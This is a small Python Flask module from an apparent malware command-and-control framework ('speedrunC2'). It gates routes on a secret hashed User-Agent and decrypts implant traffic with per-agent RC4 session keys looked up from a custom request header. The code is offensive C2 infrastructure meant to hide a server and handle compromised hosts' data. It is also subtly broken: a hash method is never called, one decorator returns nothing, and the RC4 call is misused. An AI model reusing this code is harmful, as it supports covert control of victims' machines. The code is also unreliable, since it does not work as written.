from flask import request, abort
from speedrunC2.controllers import find_agent_by_id
from speedrunC2.crypto import rc4

import hashlib


def ch0nky_ua(func):
    """
    Wraps a flask route to return a 403 if the user-agent isn't 'ch0nky'
    """
    target_digest = 'e522db1ff43fddea76815826352dde87c80da757eaf45fd20bb040e02f1e9669e683dc1dfa42c536d858c5c067250d712accd9f416de469fc93a464591f3a294'
    def wrapped_func(*args, **kwargs):
        request_ua = request.headers.get('User-Agent')
        hashed_ua = hashlib.blake2b(request_ua.encode()).hexdigest
        if hashed_ua != target_digest:
            abort(403, description="You aren't ch0nky")
        return func(*args, **kwargs)
    return wrapped_func


def default_get_paylad(func):
    def wrapped_func(*args, **kwargs):
        agent_id = request.headers.get('hellothere')
        ct = request.data
        plaintext = get_agent_payload(agent_id, ct)
        return func(*args, **kwargs)


def get_agent_payload(agent_id, ciphertext):
    agent = find_agent_by_id(agent_id)
    if not agent:
        return False 
    secret_key = bytes.fromhex(agent.session_key)
    cipher = rc4(secret_key)
    data = rc4.crypt(ciphertext)
    return data
    

